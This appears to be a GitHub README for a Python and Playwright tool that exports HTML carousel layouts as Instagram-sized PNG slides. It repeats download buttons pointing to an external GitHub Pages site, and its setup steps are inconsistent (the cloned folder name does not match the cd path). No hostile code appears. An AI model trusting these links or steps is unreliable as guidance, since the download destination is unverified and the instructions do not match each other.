# HTML to Instagram Carousel v2.4 - command-line tool 2026

> **Convert HTML carousel files into Instagram-ready slide images with a Python-based command-line workflow that produces 1080x1350 PNGs in version 2.4.**

[![Platform](https://img.shields.io/badge/Platform-HTML/CSS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.4-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carter-west1997/html-instagram-carousel-v24?style=flat-square)](https://github.com/carter-west1997/html-instagram-carousel-v24)

---

<p align="center">
  <a href="https://carter-west1997.github.io/html-instagram-carousel-v24/">
    <img src="https://img.shields.io/badge/Download-HTML%20to%20Instagram%20Carousel%20Latest-brightgreen?style=for-the-badge" alt="Download HTML to Instagram Carousel">
  </a>
</p>

> **[Direct Download - HTML to Instagram Carousel v2.4](https://carter-west1997.github.io/html-instagram-carousel-v24/)**

---

[Download Latest Build](https://carter-west1997.github.io/html-instagram-carousel-v24/)

---

## Overview

HTML to Instagram Carousel is a command-line utility that turns HTML-based carousel layouts into individual PNG slides sized for Instagram posts. It is aimed at people who already design in HTML and want a quicker route from source markup to social-ready exports without rebuilding the process manually.

The workflow is built around automated rendering and image generation. Using Python and Playwright, it gives creators, developers, and social media teams a repeatable way to produce consistent carousel slides from HTML/CSS input.

---

## What it does

- Exports carousel slides as 1080x1350 PNG images
- Renders content with Playwright and headless Chrome
- Waits for Google Fonts to load before capture
- Auto-installs dependencies on the first run
- Preserves outputs with non-destructive file naming
- Includes an AI prompt template for compatible carousel generation
- Supports automation-focused HTML-to-image workflows
- Built for Instagram and broader social media content pipelines

---

## Setup

You can clone the repository or download the project files, then run the tool from the project directory.

1. Get the source:
   - `git clone https://github.com/carter-west1997/html-instagram-carousel-v24.git
   - `cd html-to-instagram-carousel`

2. Install dependencies if needed. The tool can handle dependency setup automatically on first run.

3. Launch the command-line workflow with Python from the repository root.

If your environment is already prepared, you can jump directly to the render step using the provided script or entry command in the project files.

---

## How to use it

Create your carousel content in HTML/CSS, then point the tool to the input file or project folder used for rendering.

Typical workflow:
1. Create or edit a carousel HTML file.
2. Make sure slide assets and fonts are referenced correctly.
3. Run the conversion command.
4. Review the exported PNG slides in the output directory.
5. Upload the generated images to your Instagram posting workflow.

Example flow:
- Start from an HTML carousel template
- Render with Playwright in a headless Chrome session
- Export each slide as a separate PNG
- Keep previous outputs intact with unique filenames

For AI-assisted content creation, use the included prompt template to generate carousel structures that match the expected format before exporting.

---

## Configuration

Most settings live in the project files and in the HTML you provide as input. Common values to check include:

- Input file path
- Output folder
- Slide dimensions
- Font loading behavior
- Rendering wait time
- Naming pattern for exported images

Example configuration shape:

    {
      "input": "carousel.html",
      "output": "./exports",
      "width": 1080,
      "height": 1350
    }

If the project includes a script or environment variables for overrides, keep them alongside the source so they remain easy to reuse across exports.

---

## Requirements

- Python
- Playwright
- Headless Chrome support
- Access to HTML/CSS carousel source
- Enough local storage for rendered PNG exports
- Internet access if Google Fonts or other remote assets must be loaded during capture

---

## FAQ

**Does it work with custom carousel designs?**  
Yes, provided the HTML layout fits the rendering expectations of the tool.

**Why are fonts sometimes different in the export?**  
The workflow waits for fonts, but remote assets still need time and connectivity to finish loading before capture.

**Where do the exported images go?**  
Files are saved in the configured output folder, and the naming scheme is intended to prevent older exports from being overwritten.

**What if the first run takes longer than expected?**  
The initial launch may install dependencies and prepare the browser environment.

**How do I update to a newer version?**  
Pull the latest repository changes or replace your local files with the newer release package, then rerun the tool.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
